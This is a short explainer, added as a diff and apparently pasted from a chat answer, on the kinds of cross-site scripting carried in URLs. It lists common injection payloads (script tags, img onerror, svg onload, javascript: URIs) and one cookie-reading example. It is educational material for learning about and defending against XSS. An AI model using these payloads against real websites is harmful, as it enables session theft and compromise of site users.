@@ -1,0 +1,63 @@
+Types of XSS in URLs
+Reflected XSS in URL Parameters
+
+The malicious script is included as part of the URL (often in a query string or fragment) and executed immediately when the URL is accessed.
+Example:
+php-template
+Copy
+http://example.com/search?q=<script>alert('XSS')</script>
+In this case, if the website does not properly sanitize the q parameter, the script will be executed.
+Stored XSS via URL Input
+
+Malicious JavaScript is stored in the server's database (e.g., in a comment, profile, or feedback form) and then displayed in URLs when accessed later.
+Example:
+php-template
+Copy
+http://example.com/user/profile?name=<script>alert('XSS')</script>
+DOM-based XSS in URL Handling
+
+The script executes on the client side, manipulating the Document Object Model (DOM) based on unsanitized URL input. The page uses JavaScript to process the URL and update the page, allowing the attacker’s script to execute if input is not sanitized.
+Example:
+php-template
+Copy
+http://example.com/profile?username=<script>alert('XSS')</script>
+If JavaScript code in the web application dynamically updates the page with the value of username without sanitizing it, it could execute the injected script.
+XSS in URL Fragment Identifiers
+
+Attackers can inject malicious JavaScript into the fragment part of the URL, which is not sent to the server but handled client-side (by JavaScript in the browser).
+Example:
+php-template
+Copy
+http://example.com/#<script>alert('XSS')</script>
+If JavaScript on the page improperly handles the fragment and inserts it into the DOM, it could result in XSS.
+Common XSS Payloads in URLs
+Here are several example payloads that an attacker could use to exploit an XSS vulnerability in a URL:
+
+Basic XSS Payloads:
+
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+<svg/onload=alert('XSS')>
+<a href="javascript:alert('XSS')">Click me</a>
+Payload for Reflected XSS:
+
+php-template
+Copy
+http://example.com/search?q=<script>alert(document.cookie)</script>
+This could steal cookies if the website does not sanitize the q parameter.
+
+Payload with Image Injection:
+
+bash
+Copy
+http://example.com/search?q=<img src="x" onerror="alert('XSS')">
+Using the javascript: Protocol:
+
+bash
+Copy
+http://example.com/redirect?url=javascript:alert('XSS')
+SVG-Based XSS:
+
+bash
+Copy
+http://example.com/?query=<svg/onload=alert('XSS')>
